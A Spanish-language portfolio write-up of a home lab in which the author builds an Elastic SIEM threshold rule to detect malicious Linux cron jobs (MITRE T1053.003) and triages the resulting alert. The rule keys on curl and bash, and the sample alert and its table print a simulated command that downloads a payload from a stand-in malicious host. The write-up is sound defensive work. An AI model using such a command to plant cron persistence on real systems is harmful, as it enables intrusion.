
### 📝 **Descripción**

Laboratorio donde implementé una regla personalizada en Elastic SIEM para detectar tareas programadas maliciosas en sistemas Linux. El objetivo fue identificar intentos de persistencia mediante la creación de cron jobs que ejecutan comandos sospechosos como descargas (`curl`, `wget`) o scripts (`bash`).


### **Regla de detección

kql

event.dataset: linux.cron 
AND journald.process.name: "crond" 
AND host.name: "arclinuxlinux" 
AND message: (*curl* OR *bash*)

#### **Configuración de la regla**

| Parámetro        | Valor                                           |
| ---------------- | ----------------------------------------------- |
| Tipo         | Threshold                                       |
| Threshold    | >= 3 eventos                                    |
| Cardinalidad | @timestamp >= 3 (eventos en distintos momentos) |
| Time window  | 5 minutos                                       |
| Severidad    | Low (21)                                        |
| Índices      | logs-*                                        |
| Tags         | #Persistence, #T1053.003                    |

---

### **Evento detectado (alerta generada)**

json

{
  "kibana.alert.threshold_result.count": 15,
  "kibana.alert.threshold_result.cardinality.value": 9,
  "host.name": "arclinuxlinux",
  "journald.audit.login_uid": 1000,
  "message": "(nacho) CMDEND (curl http://malicious-site.com/payload.sh)",
  "journald.process.name": "crond",
  "process.pid": 102643,
  "process.command_line": "/usr/sbin/CROND -n"
}

#### **📌 Detalles del ataque simulado**

| Campo                 | Hallazgo                                    |
| --------------------- | ------------------------------------------- |
| **Comando ejecutado** | `curl http://malicious-site.com/payload.sh` |
| **Frecuencia**        | Cada 2 minutos                              |
| **Usuario**           | `nacho` (UID 1000)                          |
| **PID del proceso**   | 102643                                      |
| **Tipo de log**       | `linux.cron`                                |

---

### 🧠 **MITRE ATT&CK Mapping**

- **Técnica:** [T1053.003 – Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
- **Táctica:** Persistence (TA0003) y Privilege Escalation (TA0004)

---

### 🔍 **Investigación realizada**

Como parte del flujo de trabajo SOC, realicé las siguientes acciones:

1. ✅ **Validación de la alerta** – Confirmé que el evento no era un falso positivo.
2. ✅ **Identificación del comando malicioso** – Se detectó el uso de `curl` para descargar un payload.
3. ✅ **Correlación con otros eventos** – Busqué otros logs del mismo `PID` y `UID`.
4. ✅ **Búsqueda de propagación** – Consulté si el mismo patrón existía en otros hosts (`NOT host.name: arclinuxlinux`).
5. ✅ **Timeline del ataque** – Analicé la frecuencia de ejecución (cada 2 minutos).
6. ✅ **Documentación del caso** – Se creó un caso en Elastic para registrar el hallazgo.


## ✅ **Conclusión**

La regla implementada permitió:

- Detectar con éxito una tarea cron maliciosa.
- Identificar el comando, usuario y frecuencia de ejecución.
- Documentar y cerrar el caso como parte del flujo de trabajo SOC.


Este laboratorio demuestra habilidades en:

- Creación de reglas de detección personalizadas.
- Uso de Elastic SIEM en entornos Linux (Arch).
- Investigación de incidentes y mapeo MITRE ATT&CK.

---

### 🔗 **Enlaces relacionados dentro del portafolio**

- [[MITRE T1053.003 – Scheduled Task]]
- [[Caso Cron Malicioso]]
- [[Arquitectura Elastic en Arch Linux]]
- [[Detección SSH Brute Force – T1110]]